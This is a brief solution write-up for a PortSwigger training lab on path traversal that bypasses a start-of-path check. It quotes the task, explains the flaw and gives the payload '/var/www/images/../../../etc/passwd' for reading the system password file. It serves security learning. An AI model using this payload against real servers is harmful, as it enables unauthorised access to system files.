# Lab: File path traversal, validation of start of path (Practitioner)

**Lab:** [https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)

**Task (from PortSwigger):**  
This lab contains a path traversal vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Vulnerability
Path must start with `/var/www/images`. Prefix is checked, then traversal is allowed after it.

## Solution

```
filename=/var/www/images/../../../etc/passwd
```

## Final Payload
```
/var/www/images/../../../etc/passwd
```
